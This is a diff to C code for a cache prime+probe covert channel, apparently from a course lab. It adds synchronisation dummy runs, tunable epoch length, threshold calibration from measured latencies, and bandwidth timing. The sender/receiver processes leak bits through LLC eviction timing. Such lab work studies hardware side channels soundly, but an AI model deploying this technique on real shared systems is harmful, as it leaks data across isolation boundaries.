@@ -26,12 +26,15 @@
 #define NUM_PAGE_PER_ALLOC 5
 #define SYMBOL_CNT (1 << (sizeof(char) * 8))
 
-//#define EPOCH_LENGTH 2000000. // A very conservative epoch length
-#define EPOCH_LENGTH 200000. // A very conservative epoch length
+#define EPOCH_LENGTH 60000. 
 #define WTD 11 
 #define WL2 16
 #define NUM_REPEATS 1
-#define ENABLE_HELPERS 0
+#define ENABLE_HELPERS 0 
+#define ENABLE_TIMING_LOGS 0
+
+// need to run a little to let them sync up
+#define DUMMY_RUNS 30
 
 // Message we want to send
 // const uint64_t msg = 0x12345678910;
@@ -110,59 +113,84 @@ uint64_t calibrate_l2_to_llc_latency(){
 	return foo;
 }
 
-void process_sender(uint64_t start_tsc, uint64_t msg_len, uint8_t *target_page, uint64_t msg) {
+void process_sender(uint64_t start_tsc, uint64_t msg_len, uint8_t *target_page, uint64_t msg, 
+	bool enable_logging, double epoch_length) 
+	{
 	// Function pulled from the professor, for initial validation of attack
-    uint64_t next_transmission = start_tsc + EPOCH_LENGTH / 3;
-    bool transmit;
-    for (uint64_t i = 0; i < msg_len; i++) {
+    uint64_t next_transmission = start_tsc + epoch_length / 3;
+    bool transmit = false;
+    for (uint64_t i = 0; i < msg_len + DUMMY_RUNS; i++) {
 		// Synchronize send for each epoch 
         busy_wait_until(next_transmission);
-        next_transmission += EPOCH_LENGTH;
+        next_transmission += epoch_length;
 
         // Sender transmits the information by
 		// Conditionally accessing the target page 
-        transmit = msg & 1;
+		if (i >= DUMMY_RUNS) {
+			transmit = msg & 1;
+			msg = msg >> 1;
+		}
+        
         if (transmit){
         	_maccess(target_page);
         }
-        msg = msg >> 1;
-
 
         // Print the epoch information
         uint64_t now = _rdtsc();
-        uint64_t epoch_id = (now - start_tsc) / EPOCH_LENGTH;
+        uint64_t epoch_id = (now - start_tsc) / epoch_length;
         printf("EPOCH: %" PRIu64 "; Transmitting: '%d' \n", epoch_id, transmit);
     }
 }
 
-void process_receiver_helper(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, uint8_t cnt){
+void process_receiver_helper(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, uint8_t cnt, bool enable_logging, double epoch_length){
 	// The helper threads continuously load pages in the EV so they are in shared, to control the replacement policy
 	// stop the helper after a certain number of epochs
 	if (ENABLE_HELPERS == 1) {
-		uint64_t end_tsc = start_tsc + (EPOCH_LENGTH * (msg_len + 1));
-		while (_rdtsc() < end_tsc){
-			for (int i = 0; i < cnt; i++){
+		//uint64_t end_tsc = start_tsc + (epoch_length * (msg_len + 1));
+		//while (_rdtsc() < end_tsc){
+		//	for (int i = 0; i < cnt-1; i++){
+		//		_maccess(EVtd[i]);
+		//	}
+		//}
+		// setup the timers for the side channel
+
+		uint64_t next_prime = start_tsc;
+		for (uint64_t i = 0; i < msg_len + DUMMY_RUNS; i++){
+			busy_wait_until(next_prime);
+			next_prime += epoch_length;
+			for (int i = 0; i < cnt-1; i++){
 				_maccess(EVtd[i]);
 			}
 		}
+
+
 	}
 }
 
-uint64_t process_receiver(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, uint8_t **EVl2_mul, uint8_t cnt_td, uint8_t cnt_l2, uint64_t threshold, uint8_t *target_page, uint64_t msg){
+uint64_t process_receiver(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, uint8_t **EVl2_mul, 
+	uint8_t cnt_td, uint8_t cnt_l2, uint64_t threshold, 
+	uint8_t *target_page, uint64_t msg,
+	bool enable_logging, double epoch_length){
 
 	// setup handling incoming data
 	uint64_t recv_int = 0;
 	uint64_t recv_mask = 1;
 
 	// setup the timers for the side channel
-	uint64_t next_evict = start_tsc;
-	uint64_t next_reload = start_tsc + 2 * EPOCH_LENGTH / 3;
+	uint64_t next_prime = start_tsc;
+	uint64_t next_probe = start_tsc + 2 * epoch_length / 3;
+
+	struct timespec start_stamp, end_stamp;
 
 	//main receiver loop
-	for (uint64_t i = 0; i < msg_len; i++){
+	for (uint64_t i = 0; i < msg_len + DUMMY_RUNS; i++){
 		// Synchronize receive for each epoch
-		busy_wait_until(next_evict);
-		next_evict += EPOCH_LENGTH;
+		if (i == DUMMY_RUNS) {
+			clock_gettime(CLOCK_MONOTONIC_RAW, &start_stamp);
+		}
+
+		busy_wait_until(next_prime);
+		next_prime += epoch_length;
 		
 		// Prime
 		// Access L2 EV set to 
@@ -181,11 +209,10 @@ uint64_t process_receiver(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, 
 		}
 	
 		_lfence();
-		 // tconf->traverse(cands, cnt, tconf);
 
 		// wait for side channel transmission 
-		busy_wait_until(next_reload);
-		next_reload += EPOCH_LENGTH;
+		busy_wait_until(next_probe);
+		next_probe += epoch_length;
 
 		// Probe
 		int ev_kicked_count = 0;
@@ -209,7 +236,9 @@ uint64_t process_receiver(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, 
 			uint64_t start = _timer_start();
 			_maccess(EVtd[ii]);
 			uint64_t lat = _timer_end() - start;
-			printf("EV TD - Time Diff: %" PRIu64 " \n", lat);
+			if (enable_logging == 1) {
+				printf("EV TD - Time Diff: %" PRIu64 " \n", lat);
+			}
 		    if (lat > threshold) {
 				ev_kicked_count++;
 			}
@@ -276,19 +305,25 @@ uint64_t process_receiver(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, 
 
 		// Print the results
 		uint64_t now = _rdtsc();
-		uint64_t epoch_id = (now - start_tsc) / EPOCH_LENGTH;
+		uint64_t epoch_id = (now - start_tsc) / epoch_length;
 		//printf("EPOCH: %" PRIu64 "; Receiving: '%d', latency: %lu, EV Kicked Count: %d \n", epoch_id, received_val, lat, ev_kicked_count);
+
 		printf("EPOCH: %" PRIu64 "; Receiving: '%d', EV Kicked Count: %d \n", epoch_id, received_val, ev_kicked_count);
 
 		// save results. Use mask to help
-		if (epoch_id < msg_len){
-			if (received_val){
-				recv_int = recv_int | recv_mask;
+		if (i >= DUMMY_RUNS) {
+			if (epoch_id < msg_len + DUMMY_RUNS){
+				if (received_val){
+					recv_int = recv_int | recv_mask;
+				}
+				recv_mask = recv_mask << 1;
 			}
-			recv_mask = recv_mask << 1;
 		}
 	}
 	
+	clock_gettime(CLOCK_MONOTONIC_RAW, &end_stamp);
+	uint64_t delta_ns = (end_stamp.tv_sec - start_stamp.tv_sec) * 1000000000 + (end_stamp.tv_nsec - start_stamp.tv_nsec);
+
 	// print overall results
 	printf("-----------------------------------------\n");
     printf("Expecting: ");
@@ -307,21 +342,29 @@ uint64_t process_receiver(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, 
 	uint64_t num_fn = count_mismatch(false_negatives);
 	printf("False Negatives: %lu\n", num_fn);
 	
+	// Timing 
+	printf("total attack time = %luns\n", delta_ns);
+	uint64_t bandwidth = sizeof(msg) * 1000000000/ delta_ns;
+	printf("bandwidth = %lu B/s\n", bandwidth);
 
 
 	return num_mismatch;
 
 }
 
-void test_ev_set(uint8_t *target, uint8_t **EVl2_mul, uint8_t cnt_l2, uint8_t **EVtd, uint8_t cnt_td){
+uint64_t test_ev_set(uint8_t *target, uint8_t **EVl2_mul, uint8_t cnt_l2, uint8_t **EVtd, uint8_t cnt_td){
 	printf("Testing eviction\n");
 
+	double l2_lat = 0.;
+	double llc_lat = 0.;
+	
 	for (int i =0; i < 5 ; i++){
 		_maccess(target);
 		uint64_t start = _timer_start();
 		_maccess(target);
 		uint64_t lat = _timer_end() - start;
 		printf("Non evict latency: %lu\n", lat);
+		l2_lat += lat;
 
 		for (int j = 0 ; j < 6; j++){
 			for (int m = 0; m < cnt_l2; m++){
@@ -332,7 +375,7 @@ void test_ev_set(uint8_t *target, uint8_t **EVl2_mul, uint8_t cnt_l2, uint8_t **
 		_maccess(target);
 		lat = _timer_end() - start;
 		printf("L2 evict latency: %lu\n", lat);
-
+		llc_lat += lat;
 		for (int j = 0 ; j < 6; j++){
 			for (int m = 0; m < cnt_l2; m++){
 				_maccess(EVl2_mul[m]);
@@ -349,9 +392,37 @@ void test_ev_set(uint8_t *target, uint8_t **EVl2_mul, uint8_t cnt_l2, uint8_t **
 		printf("td evict latency: %lu\n", lat);
 	}
 
+	printf("L2 Lat Total: %f\n", l2_lat);
+	printf("LLC Lat Total: %f\n", llc_lat);
+	l2_lat /= 5.;
+	llc_lat /= 5;
+	printf("L2 Lat Avg: %f\n", l2_lat);
+	printf("LLC Lat Avg: %f\n", llc_lat);
+	return (l2_lat + llc_lat) / 2.;
+
 }
 
-int main(){
+int main(int argc, char *argv[]) {
+    bool enable_logging = false;
+    double epoch_length = EPOCH_LENGTH;
+
+    for (int i = 1; i < argc; i++) {
+        if ((strcmp(argv[i], "-enable_logging") == 0) || (strcmp(argv[i], "-l") == 0)) {
+			enable_logging = true;
+        } 
+        else if ((strcmp(argv[i], "-epoch_length") == 0) || (strcmp(argv[i], "-e") == 0)) {
+            if (i + 1 < argc) {
+                epoch_length = atof(argv[i + 1]);
+                i++;  // Skip value
+            }
+        }
+        else {
+            fprintf(stderr, "Unknown argument: %s\n", argv[i]);
+            return 1;
+        }
+    }
+
+
 	uint64_t msg = ((uint64_t)rand() << 32) | rand(); 
 
 	int ret = 0;
@@ -390,7 +461,7 @@ int main(){
 
 	// calibrate the latency
 	//uint64_t threshold = calibrate_latency();
-	uint64_t threshold = calibrate_l2_to_llc_latency();
+	//uint64_t threshold = calibrate_l2_to_llc_latency();
 
 	// generate the eviction sets
 	single_llc_evset(target_page, EVl2_mul, &cnt_l2, EVtd, &cnt_td, evb_td, evcand_l2);
@@ -403,13 +474,13 @@ int main(){
 	printf("cnt_td: %d\n", cnt_td);
 	printf("cnt_l2: %d\n", cnt_l2);
 	
-	test_ev_set(target_page, EVl2_mul, cnt_l2, EVtd, cnt_td);
+	uint64_t threshold = test_ev_set(target_page, EVl2_mul, cnt_l2, EVtd, cnt_td);
 
 	for (int i = 0; i < NUM_REPEATS; i ++ ){
 		_lfence();
 		// sizeof returns number of bytes in msg, so multiply by 8 to get the total number of bits
 		uint64_t msg_len = sizeof(uint64_t) * 8;
-		uint64_t start_tsc = (_rdtsc() / EPOCH_LENGTH + 10) * EPOCH_LENGTH;
+		uint64_t start_tsc = (_rdtsc() / epoch_length + 10) * epoch_length;
 		// process_receiver_helper(start_tsc, msg_len, EVtd);
 		// process_receiver_helper(start_tsc, msg_len, EVtd, cnt_td);
 		// printf("Done with helper\n");
@@ -420,7 +491,7 @@ int main(){
 		if (pid == 0) {
 			// Victim/ sender
 			printf("Sender\n");
-			process_sender(start_tsc, msg_len, target_page, msg);
+			process_sender(start_tsc, msg_len, target_page, msg, enable_logging, epoch_length);
 			printf("Sender Done\n");
 
 		}
@@ -429,7 +500,7 @@ int main(){
 			if (pid2 == 0) {
 				// helper 0 
 				printf("Helper 0\n");
-				process_receiver_helper(start_tsc, msg_len, EVtd, cnt_td);
+				process_receiver_helper(start_tsc, msg_len, EVtd, cnt_td, enable_logging, epoch_length);
 				printf("Helper 0 done\n");
 			}
 			else if (pid2 > 0) {
@@ -437,13 +508,13 @@ int main(){
 				if (pid3 == 0){
 					// helper 1
 					printf("Helper 1\n");
-					process_receiver_helper(start_tsc, msg_len, EVtd, cnt_td);
+					process_receiver_helper(start_tsc, msg_len, EVtd, cnt_td, enable_logging, epoch_length);
 					printf("Helper 1 done\n");
 				}
 				else if (pid3 > 0) {
 					// primary process is attacker
 					printf("Attacker\n");
-					total_mismatch += process_receiver(start_tsc, msg_len, EVtd, EVl2_mul, cnt_td, cnt_l2, threshold, target_page, msg);
+					total_mismatch += process_receiver(start_tsc, msg_len, EVtd, EVl2_mul, cnt_td, cnt_l2, threshold, target_page, msg, enable_logging, epoch_length);
 					wait(NULL); //wait for child process
 				}
 				else {
